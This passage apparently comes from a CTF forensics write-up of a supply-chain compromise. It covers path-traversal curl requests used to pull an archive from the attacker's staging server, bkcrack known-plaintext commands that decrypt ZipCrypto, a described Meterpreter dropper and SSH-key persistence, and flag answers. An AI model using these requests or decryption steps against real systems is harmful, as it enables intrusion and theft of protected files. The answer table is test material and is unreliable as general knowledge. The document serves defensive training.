### Step 6 — Flask LFI on staging to recover LOOT.zip (Q9, Q10, Q12, Q13)

The staging server exposes a Flask app (`/home/moran/Flask_server/app.py`) with a **path traversal / LFI** in the `/download?file=` endpoint. Once the `X-Operator-Auth` cookie is satisfied, `../../` allows reading arbitrary files outside the served directory. That is how `LOOT.zip` (Q13) is recovered without any system credentials:

```bash
# Pull the loot via LFI (path traversal) once past the cookie gate
curl -s --cookie "X-Operator-Auth=napoleon_moran_1894" \
  "http://BlackPearl2026.htb:9999/download?file=../../home/moran/LOOT.zip" \
  -o LOOT.zip

# Read app.py itself to understand the bug (same technique)
curl -s --cookie "X-Operator-Auth=napoleon_moran_1894" \
  "http://BlackPearl2026.htb:9999/download?file=../../home/moran/Flask_server/app.py"
```

The exfil and anti-forensics sequence reads out of both `session_events` and `audit.log`. The attacker navigates to `~/Work_Stuff/ONBOARDING/`, locates the PDF with `search -d ONBOARDING -f *.pdf` (Q12), downloads it, then spawns a shell (channel 5, **PID 1549**, Q10) that deletes the victim's original with `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` (Q9), followed by `ls -la` to confirm the deletion:

```bash
# Anti-forensics on PID 1549 (shell channel 5)
ausearch -i -if var/log/audit/audit.log -m EXECVE 2>/dev/null | grep -A1 'pid=1549'
#   rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
#   ls -la
```

### Step 7 — bkcrack: known-plaintext against ZipCrypto (Q14, Q15)

`LOOT.zip` (38,934 bytes) uses legacy **ZipCrypto** encryption, not AES. The password is not in rockyou, but ZipCrypto is vulnerable to a **known-plaintext** attack: if we know ≥12 plaintext bytes of one entry, `bkcrack` derives the three internal keys and decrypts the whole archive without the password. The `README.txt` entry is a generic, predictable SOP (CRC32 `e4d5acac`), an ideal oracle:

```bash
# 1) List entries and CRCs (confirms README.txt = e4d5acac, ZipCrypto)
unzip -v LOOT.zip

# 2) Prepare the known plaintext of the README (standard operator SOP text)
printf 'Package into a password protected zip. Remove remnants.\n' > known_readme.txt

# 3) Derive the internal keys with the known-plaintext
bkcrack -C LOOT.zip -c README.txt -p known_readme.txt
#   keys: 85b6bbc1 27824945 ce665bee

# 4) Decrypt each entry with the keys (no password needed)
bkcrack -C LOOT.zip -k 85b6bbc1 27824945 ce665bee \
  -c Gov_HR_Continuity_Emergency_Callout_Roster.pdf -d roster.pdf
bkcrack -C LOOT.zip -k 85b6bbc1 27824945 ce665bee -c cvoss_exfil -d cvoss_exfil
# Alternative: -U loot_clear.zip newpass  → rewrite the zip with a known password
```

The loot holds three files: the classified PDF; `cvoss_exfil` (41 bytes) with the reusable credential `tainsworth:d10g3n3s_T1ck3ts#2026:forever`; and `README.txt` (SOP: *"Package into a password protected zip. Remove remnants."*). Opening the roster (`Gov_HR_Continuity_Emergency_Callout_Roster.pdf`) reveals the table of 12 government employees. One record has its `Position` field marked **REDACTED** and classification **CONFIDENTIAL**: **Sarah Kemp** (Q14), ID `DIO-1648`, Identity Operations, home address **Flat 6, Ashdown House, Palace Court, London W2 4LS** (Q15) — NAPOLEON's real target, an identity operative whose role was hidden even inside the classified document.

### Cronología

| Time / phase | PID | Event |
|--------------|-----|-------|
| Pre-compromise | — | Moran creates `diogenes-ticket-parser` on `devforge.internal:3000`; `msfvenom` builds the reverse-TCP (LPORT 31337); XOR with `diogenes.jpg` → `calibration.bin` |
| Initial access | — | Tom clones the repo; `ticket_parser.py` → `telemetry.py` reconstructs the ELF and writes it to `~/.cache/.ticket-parser/.integrity` |
| C2 established | **1514** | Meterpreter connects to `BlackPearl2026.htb:31337`; `getuid` → Tom |
| Persistence (fail 1) | 1516 | SSH-key `wget` fails — typo in auth cookie |
| Persistence (fail 2) | 1521 | `wget` fails — missing port in URL |
| Persistence (success) | 1525 | `wget` plants `authorized_keys` from `203.0.113.10:9999` |
| Discovery | — | `search -d ONBOARDING -f *.pdf` locates the roster |
| Exfiltration | — | Downloads `Gov_HR_Continuity_Emergency_Callout_Roster.pdf` to staging |
| Anti-forensics | **1549** | `rm` of the PDF on the victim + `ls -la`; then `history -c` |
| Post (attacker) | — | Packages `LOOT.zip` (ZipCrypto) in `/home/moran/` |

### IOCs

| Type | Indicator |
|------|-----------|
| C2 domain | `BlackPearl2026.htb` |
| C2 port | `31337/tcp` (Meterpreter reverse-TCP) |
| File exchange | `BlackPearl2026.htb:9999` (Flask) |
| Staging IP | `203.0.113.10` |
| Malicious repo | `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` |
| Author / email | `Sebastain Moran <cbass.Moran@blackpearl2026.htb>` |
| Auth cookie | `X-Operator-Auth=napoleon_moran_1894` |
| Implant path | `/home/Tom/.cache/.ticket-parser/.integrity` |
| Dropper | `src/ticket_parser/telemetry.py` (XOR `diogenes.jpg` ⊕ `calibration.bin`) |
| MSF payload | `linux/x64/meterpreter_reverse_tcp` |
| Credential | `tainsworth:d10g3n3s_T1ck3ts#2026:forever` |
| Exfil artifact | `LOOT.zip` (README.txt CRC `e4d5acac`; keys `85b6bbc1 27824945 ce665bee`) |
| Implant / anti-forensics PID | `1514` / `1549` |

### MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1195.002 Supply Chain Compromise: Software | Poisoned `diogenes-ticket-parser` package on Gitea |
| Execution | T1059.006 Command and Scripting Interpreter: Python | `ticket_parser.py` / `telemetry.py` |
| Execution | T1204.002 User Execution: Malicious File | Tom runs the parser after cloning |
| Defense Evasion | T1027 Obfuscated Files or Information | ELF hidden as XOR of `diogenes.jpg` ⊕ `calibration.bin`; base64 trigger |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | Runtime XOR reconstruction of the implant |
| Defense Evasion | T1070.003 Indicator Removal: Clear Command History | `history -c` on the victim |
| Defense Evasion | T1070.004 Indicator Removal: File Deletion | `rm` of the exfiltrated PDF (PID 1549) |
| Command and Control | T1071 / T1571 Non-Standard Port | Meterpreter reverse-TCP to `:31337` |
| Persistence | T1098.004 Account Manipulation: SSH Authorized Keys | `wget` plants the public key in `authorized_keys` |
| Discovery | T1083 File and Directory Discovery | `search -d ONBOARDING -f *.pdf` |
| Collection / Exfiltration | T1560.001 Archive via Utility | Password-protected `LOOT.zip` (ZipCrypto) |
| Credential Access | T1552.001 Credentials in Files | `cvoss_exfil` with Tom's credential |

### Detection and remediation

**Detection**
- **auditd on `execve`** is the ultimate safety net: even though the attacker ran `history -c`, every Meterpreter child process (`wget`, `rm`, `ls`) was recorded. Recommended rule: `-a always,exit -F arch=b64 -S execve -k proc_exec`, and ship `audit.log` off-host in real time.
- **EDR/network:** alert on outbound connections to non-standard ports (`:31337`, `:9999`) from processes in cache paths (`~/.cache/**/.integrity`). Dot-prefixed ELF files under `.cache` are anomalous by definition.
- **Supply chain:** monitor internal repo clones and validate commit metadata; an author email with an external domain (`blackpearl2026.htb`) inside an internal repo is a red flag.
- **YARA/hunting:** look for Python modules that read a `.jpg` and a `.bin` and XOR them byte by byte, or that hold long base64 constants executed via `os.system`/`subprocess`.

**Remediation**
- Immediately rotate the `tainsworth:...` credential (reusable, tagged `forever`) and purge the attacker's SSH key from Tom's `~/.ssh/authorized_keys`.
- Remove the `diogenes-ticket-parser` package from the internal Gitea, invalidate the commit, and audit who else cloned it (`devforge.internal:3000` access logs).
- Enforce mandatory commit signing (GPG/sigstore) and review internal dependencies as if they were third-party.
- On the loot itself: ZipCrypto archives are trivial to break via known-plaintext; migrate to AES-256 and never treat "the zip password" as a control.
- Notify Sarah Kemp (`DIO-1648`) and her chain of command: her identity and home address were compromised; activate the physical-protection protocol for the Diogenes HR Continuity programme.

### Answers / flags

| # | Question | Answer |
|---|----------|--------|
| 1 | Malicious repository name | `diogenes-ticket-parser` |
| 2 | Attacker email address | `cbass.Moran@blackpearl2026.htb` |
| 3 | XOR key file used to decode the payload | `calibration.bin` |
| 4 | Full path of the dropped implant | `/home/Tom/.cache/.ticket-parser/.integrity` |
| 5 | C2 callback port | `31337` |
| 6 | Implant process PID | `1514` |
| 7 | Attacker file server host:port | `BlackPearl2026.htb:9999` |
| 8 | Authentication cookie | `X-Operator-Auth=napoleon_moran_1894` |
| 9 | Anti-forensics command | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| 10 | Anti-forensics shell PID | `1549` |
| 11 | MSF payload setup command | `set payload linux/x64/meterpreter_reverse_tcp` |
| 12 | File search command | `search -d ONBOARDING -f *.pdf` |
| 13 | Exfiltration archive name | `LOOT.zip` |
| 14 | Person with the redacted position | Sarah Kemp |
| 15 | Address of that person | Flat 6, Ashdown House, Palace Court, London W2 4LS |

### Lessons

- **Internal supply chain:** a typo in a commit author's name (`Sebastain`) and a "telemetry" module are enough to smuggle in a dropper. Audit internal Gitea/Git dependencies as if they were external.
- **auditd is forensic gold:** with `history -c` wiping the obvious evidence, `/var/log/audit/audit.log` (EXECVE with hex arguments) reconstructs the entire attack at process level.
- **Cross-artifact correlation:** the attacker's own MSF DB (`session_events` in PostgreSQL:5433) provides the canonical timeline; cross-referencing it with the victim triage PIDs confirms every action.
- **XOR "in plain sight":** hiding the ELF as `calibration.bin` XOR `diogenes.jpg` evades static scanning; replaying the XOR in Python reveals the real Meterpreter.
- **ZipCrypto is still weak:** with a single known-plaintext entry (a SOP README), bkcrack recovers the internal keys and decrypts the ZIP without the password.

### Serie · The Reichenbach Directive

| # | Sherlock | Link |
|---|----------|------|
| S01 | Silent Dividend | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
| **S05** | **Poisoned Branch** ← *you are here* | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| S06 | Silent Passenger | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |
